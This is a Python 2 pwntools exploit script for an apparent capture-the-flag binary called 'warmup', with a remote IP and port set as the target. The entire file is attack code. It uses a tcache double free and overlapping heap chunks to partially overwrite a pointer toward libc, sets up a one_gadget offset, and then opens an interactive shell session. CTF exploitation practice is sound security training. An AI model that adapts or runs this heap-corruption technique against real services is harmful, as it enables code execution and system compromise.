#!/usr/bin/env python2

from pwn import *

BINARY = './warmup'
HOST, PORT = '47.52.90.3', 9999

elf = ELF(BINARY)

context.arch = 'amd64'

if not args.REMOTE:
	libc = elf.libc
else:
	libc = ELF('./libc-2.27.so')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(content):
    p.sendlineafter('>>', '1')
    p.sendafter('>>', str(content))

def free(idx):
    p.sendlineafter('>>', '2')
    p.sendlineafter(':', str(idx))

def modify(idx, content):
    p.sendlineafter('>>', '3')
    p.sendlineafter(':', str(idx))
    p.sendafter('>>', str(content))

context.terminal = ['tmux', 'new-window']
p = start()
if not args.REMOTE and args.GDB:
	debug([0xedf]) # print_menu 0xedf

one_gadget = 0x4f2c5 # 0x4f322, 0x10a38c

# Get chunk right above chunk A
add('A'*0x40) # Chunk A (idx 0)
add('B'*0x30 + p64(0) + p8(0x51)) # Chunk B prev inuse bit set so we can free fake smallbin chunk A later (idx 1)
add('C'*0x40) # Chunk C to prevent call to unlink (malloc.c line 4291), chunk C (idx 2)
free(0) # Free chunk A once
free(0) # Double free to cause heap address to be put on the heap
add(p8(0x60)) # Chunk A set fd pointer LSB to 0x60 (idx 0)
add(p64(0)) # Chunk A duplicate (idx 3)
add('D'*0x8 + p64(0x51) + p8(0x60)) # Chunk C overlapped with chunk A and set chunk A FD to 0x78 (idx 4)

# Fill up tcache bin size 0x90
for i in range(7):
    free(3)

free(3) # libc address put on heap
modify(4, p64(0) + p64(0x51) + p16(0x5760))

p.interactive()
